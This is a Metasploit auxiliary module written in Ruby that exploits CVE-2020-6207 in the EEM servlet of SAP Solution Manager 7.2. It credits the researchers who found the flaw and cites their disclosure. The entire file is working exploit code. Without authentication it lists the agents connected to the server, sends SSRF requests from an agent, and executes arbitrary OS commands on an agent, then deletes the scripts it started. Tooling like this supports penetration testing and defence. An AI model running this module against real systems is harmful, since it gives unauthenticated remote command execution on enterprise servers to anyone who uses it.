##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
            'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
            'Dmitry Chastuhin', # @chipik The researcher who made first PoC
            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
          ],
        'Description' => %q{
          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
          checks when submitting SOAP requests to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
          send HTTP request (SSRF), and execute OS commands on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.

          Successful exploitation of the vulnerability enables unauthenticated remote attackers to achieve SSRF and execute OS commands from the agent connected
          to SolMan as a user from which the SMDAgent service starts, usually the daaadm.
        },
        'References' =>
          [
            ['CVE', '2020-6207'],
            ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
            ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
          ],
        'Actions' => [
          ['LIST', { 'Description' => 'List connected agents' }],
          ['SSRF', { 'Description' => 'Send SSRF from connected agent' }],
          ['EXEC', { 'Description' => 'Exec OS command on connected agent' }]
        ],
        'DefaultAction' => 'LIST',
        'DisclosureDate' => '2020-10-03'
      )
    )
    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
        OptString.new('SSRF_METHOD', [false, 'HTTP method for SSRF', 'GET'], conditions: %w[ACTION == SSRF]),
        OptString.new('SSRF_URI', [false, 'URI for SSRF', 'http://127.0.0.1:80/'], conditions: %w[ACTION == SSRF]),
        OptString.new('COMMAND', [false, 'Command for execute in agent', 'id'], conditions: %w[ACTION == EXEC]),
        OptString.new('AGENT', [false, 'Agent server name for exec command or SSRF', 'agent_server_name'], conditions: ['ACTION', 'in', %w[SSRF EXEC]]),
      ]
    )
  end

  def setup_xml_and_variables
    @host = datastore['RHOSTS']
    @port = datastore['RPORT']
    @path = datastore['TARGETURI']

    @agent_name = datastore['AGENT']
    @script_name = Rex::Text.rand_text_alphanumeric(12)

    if datastore['SSL']
      @schema = 'https://'
    else
      @schema = 'http://'
    end

    @solman_uri = "#{@schema}#{@host}:#{@port}#{@path}"

    @ssrf_method = datastore['SSRF_METHOD']
    @ssrf_uri = datastore['SSRF_URI']
    @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)
    @rce_command = datastore['COMMAND']
  end

  # Report Service and Vulnerability
  def report_service_and_vuln
    report_service(
      host: @host,
      port: @port,
      name: 'soap',
      proto: 'tcp',
      info: 'SAP Solution Manager'
    )
    report_vuln(
      host: @host,
      port: @port,
      name: name,
      refs: references
    )
  end

  def run
    case action.name
    when 'LIST'
      action_list
    when 'SSRF'
      action_ssrf
    when 'EXEC'
      action_exec
    else
      print_error("The action #{action.name} is not a supported action.")
    end
  end

  def action_list
    setup_xml_and_variables

    print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
    agents = make_agents_array

    report_service_and_vuln
    if agents.empty?
      print_good("Solution Manager server: #{@host}:#{@port} is vulnerable but no agents are connected!")
    else
      print_good("Successfully retrieved agent list:\n#{pretty_agents_table(agents)}")
    end
  end

  def action_ssrf
    setup_xml_and_variables
    check_agent(@agent_name)

    print_status("Enable EEM on agent: #{@agent_name}")
    enable_eem(@agent_name)

    print_status("Start script: #{@script_name} with SSRF payload on agent: #{@agent_name}")
    send_soap_request(make_soap_body(@agent_name, @script_name, @ssrf_payload))

    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
    stop_script_in_agent(@agent_name, @script_name)

    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
    delete_script_in_agent(@agent_name, @script_name)

    report_service_and_vuln
    print_good("Send SSRF: '#{@ssrf_method} #{@ssrf_uri} HTTP/1.1' from agent: #{@agent_name}")
  end

  def action_exec
    setup_xml_and_variables
    check_agent(@agent_name)

    print_status("Enable EEM on agent: #{@agent_name}")
    enable_eem(@agent_name)

    print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
    send_soap_request(make_soap_body(@agent_name, @script_name, make_rce_payload(@rce_command)))

    print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
    stop_script_in_agent(@agent_name, @script_name)

    print_status("Delete script: #{@script_name} on agent: #{@agent_name}")
    delete_script_in_agent(@agent_name, @script_name)

    report_service_and_vuln
    print_good("Execution command: '#{@rce_command}' on agent: #{@agent_name}")
  end

end
